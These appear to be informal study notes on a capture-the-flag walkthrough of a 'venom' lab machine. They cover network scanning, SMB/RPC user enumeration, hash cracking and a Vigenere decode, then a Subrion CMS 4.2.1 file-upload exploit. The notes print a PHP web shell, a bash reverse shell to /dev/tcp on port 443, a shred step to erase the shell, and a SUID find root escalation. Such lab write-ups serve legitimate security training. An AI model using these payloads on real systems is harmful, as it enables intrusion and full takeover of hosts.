ingles a españolSKILLS

- Cracking Hashes
- RPC Enumeration
- FTP Enumeration
- RPC RID Cycling Attack (Manual brute force) + Xargs Boost Speed Tip - Discovering valid system users

- Crypto Challenge - Vigenere Cipher
- Subrion CMS v4.2.1 Exploitation - Arbitrary File Upload (Phar files) [RCE]
- Listing system files and discovering privileged information
- Abusing SUID binary (find) [Privilege Escalation]


CERTIFICATIONS

eJPT eWPT


Frirst step

```
sudo arp-scan -I wlan0 --localnet
```

Allways send a ping

ping -c 1 192.168.100.53 

ttl=64 (linux)
```
namp -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.53 -oN
```

```
nmap -sCV -p21,80,139,443,445 192.168.100.57 -oN targeted
```

Apache httpd 2.4.29 launchpad = ubuntu bionic



Now he sais, that that we can try to connect with openssl because its open the port 443 (https) and with the responses we can get more information

openssl s_client -connect 192.168.0.54:443
```
nt -connect 192.168.0.54:443
CONNECTED(00000003)
40476932DF7F0000:error:0A00010B:SSL routines:ssl3_get_record:wrong version number:../ssl/record/ssl3_record.c:354:
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 5 bytes and written 423 bytes
Verification: OK
---
New, (NONE), Cipher is (NONE)
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)

```
he said there is nothing interesting

in the port 21 we havent the "ftp.anon.nse" anonymous , to connect on it 

port 80 http .. we are going to see what we can obtain with whatweb

... we have the apache default web on it

But on the apache default page we have this 
its a hash and supposedly it is on md5
5f2a66f947fa5690c26506f66bde5c23

we can use hash identifier to see

```
kali> hash-identifier
```

and efectively it's an MD5

so, if we go to https://crakstation.net

we can see

"hostinger" its the result

SMB on, so with this comand we can see te shared resourses existing on the side of this machine

smbmap -H 192.168.0.54

there are two shared resources but there is no access
```
[+] Guest session       IP: 192.168.0.54:445    Name: 192.168.0.54                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (venom server (Samba, Ubuntu))

```

before enumerate the HTTP service (dns, etc) he is going to try something on the  139 netbios port tcp open


This is a session, but a null sesion
```
rpcclient -U "" 192.168.0.54 -N

```
So i can connect 
This gives us some infomation of the server
```
kali> srvinfo
```
we are going to make a "enumeration"

```
#THIS IS AN AUTOMATIC WAY

kali>enum4linux RI Cycling attack

```


-c comand -U user  -N (null(???))
```
# THIS IS A MANUAL WAY

rcpclient -U "" 192.168.0.55 -N -c "help" | grep sid
```
result
```
rpcclient -U "" 192.168.0.55 -N -c "help" | grep sid
       uidtosid         Convert uid to sid
     lookupsids         Convert SIDs to names
    lookupsids3         Convert SIDs to names
lookupsids_level                Convert SIDs to names
     lsaenumsid         Enumerate the LSA SIDS
lsaquerytrustdominfobysid               Query LSA trusted domains info (given a SID)
```
of course this is the important

lsaenumsid         Enumerate the LSA SIDS
And this is the result
```
S-1-5-32-550
S-1-5-32-548
S-1-5-32-551
S-1-5-32-549
S-1-5-32-
```
If we need to see the information we use 
"lookupsids S-1-5-32-550"
```
kali> S-1-5-32-550 BUILTIN\Print Operators (4)
```

he is using now a bucle
```
for i in $(seq 1 1000); do rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-5-32-$i" ; done
```
another way to go faster is (because xarg uses 50 threads at the same time)
```
seq 1 1000 | xargs -P 50 -I {} rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-5-32-{}" | grep -v "unknown"
```
This are groups, we want to know USERS , like root , wdata, etc.. important ones

so in this way we can search
```
rpcclient -U "" 192.168.0.55 -N -c "lookupnames root"
```
this is the report
```
kali>root S-1-22-1-0 (User: 1)
```

Now , we must search on this log, the the sids on this .. on this way
```
cds@cds:~$ rpcclient -U "" 192.168.0.55 -N -c "lookupnames root"
root S-1-22-1-0 (User: 1)
cds@cds:~$ rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-22-1-0"S-1-22-1-0 Unix User\root (1)
cds@cds:~$ rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-22-1-1"
S-1-22-1-1 Unix User\daemon (1)
cds@cds:~$ rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-22-1-2"
S-1-22-1-2 Unix User\bin (1)
cds@cds:~$ rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-22-1-3"
S-1-22-1-3 Unix User\sys (1)
cds@cds:~$ rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-22-1-4"
S-1-22-1-4 Unix User\sync (1)
cds@cds:~$ 
```

They are users on the /etc/passwd folder.


With this one he is filtering by regular expressions
```
seq 1 1500 | xargs -P 50 -I {} rpcclient -U "" 192.168.0.55 -N -c "lookupsids S-1-22-1-{}" | grep -oP '.*User\\[a-z].*\s'
```

there are two users, nathan and hostinger

```
S-1-22-1-1000 Unix User\nathan 
S-1-22-1-1002 Unix User\hostinger 
```

now with ftp we are going to get int

ftp 192.168.0.57

so the user is hostinger and pass hostinger

we just transfer it with "get" 
```
ftp> get hint.txt
local: hint.txt remote: hint.txt
229 Entering Extended Passive Mode (|||44274|)
150 Opening BINARY mode data connection for hint.txt (384 bytes).
100% |********|   384      168.01 KiB/s    00:00 ETA
226 Transfer complete.
384 bytes received in 00:00 (89.39 KiB/s)
```

Lets decode the first part of "hint.txt"... we must use base 64 many times 
we can put echo "asdasd" | base64 -d | base 64 -d | base64 -d 


standard vigenere cipher
(this is a type of cyphered that needs a key)

and the other item is... 
https://cryptii.com/pipes/vigenere-cipher
text:
L7f9l8@J#p%Ue+Q1234 

key:
hostinger



we need to modify the /etc/host and put the ip of the target with the venom.box link that we cannot acces before

now we are going to see whatweb on the machine venom.box


```
Apache[2.4.29], Bootstrap, Cookies[INTELLI_06c8042c3d], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.0.58], JQuery, MetaGenerator[Subrion CMS - Open Source Content Management System], Open-Graph-Protocol, PoweredBy[Subrion], Script, Title[Home :: Powered by Subrion 4.2], UncommonHeaders[x-powered-cms], X-UA-Compatible[IE=Edge]

```

we are going to see what is Subrion 4.2 on google
(system content open source)


the user is dora
and the password.. that one of the vigenere cypher (decoded)

E7r9t8@Q#h%Hy+M1234

Now we are going to see if there are some kind of exploits for Subrion 4.2.1

we find a arbitrary file upload: php/webapps/49876.py

Now.. on the folder " downloads"

we created an archive called 

"pwned.phar"
with this code inside
```
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>


```

This script is used to watch on the folders of the machine... 

we have this url.. 
http://venom.box/uploads/pwned.phar

and here we can put comands

http://venom.box/uploads/pwned.phar?cmd=whoami

http://venom.box/uploads/pwned.phar?cmd=ls%20-la

if some commands doesnt work, we can se information, like this
(Dice que hay que convertir el STDIN al STDOUT para que se vea el error)
2>& (ampers and el codigo es %26 en url)
2>%26

We can see errors.. ifconfig not found.

![[imagen.png]]

when we put ip a 
```
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s17:  mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:6e:29:1f brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.59/24 brd 192.168.0.255 scope global dynamic noprefixroute enp0s17
       valid_lft 3097sec preferred_lft 3097sec
    inet6 fe80::fcff:b4dc:4cd3:6999/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

as you know, we can make commands , so we are going to execute a shell on this url

first listen on netcat

and the exploit is this
(& is = %26)
bash -c "bash -i >%26 /dev/tcp/192.168.0.22/443 0>%261"

so we are in.. if we dont want to make a threatment on the console... we can use **pwncat** ..

pwncat-cs  -lp 443 (I MUST DOWNLOAD PWNCAT)

(instalatela)

Use shred in the archive called pwned.phar
```
shred -zun 10 -v pwned.phar
```

now we go to /home/ and we see that there are two users
-hostinger
-nathan


lets look for hidden folders

this is interesting....
cat .bash_history

he make things on this folder 

hostinger@venom:~$ cd 


/var/www/html/subrion/

in this folder there are another called backup, and a hidden archive called 

.htaccess

the password of nathan

FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a

this shows my credentials 
```
id
uid=1000(nathan) gid=1000(nathan) groups=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```
we are in the sudo group

sudo su
(i am not allowed to log in, as root on venom)

sudo -l
(this shos all the commands that i can do, or my sudo priviledges)


the version of sudo 

sudo --version
```
nathan@venom:/var/www/html/subrion/backup$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

```

Watching permisions
find \-perm -4000 2>/dev/null

we have the pkxd, but we are not going to use it, is verye easy be sudo with this method

we are using  "find" as root, so we can exploit this, if we can injet a command , this we are going to execute as root.. because we have this permisions,
find has an excec


This is vulnerable, if we concatenate
find /root/  with something we  can be root..

so if we find on gtfobins.com we have this command

```
sudo find . -exec /bin/sh \; -quit
```

FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a


we can use (-p privileged, instead of sudo)
find . -exec /bin/sh -p \; -quit

and the bash its a little ugly , so if we put
bash -p its beter

and if we put only bash when we are in, we use a better bash

another way is ony putting

sudo -u root bash

we execute sudo as the user root, and then we execute a bash, or another command.

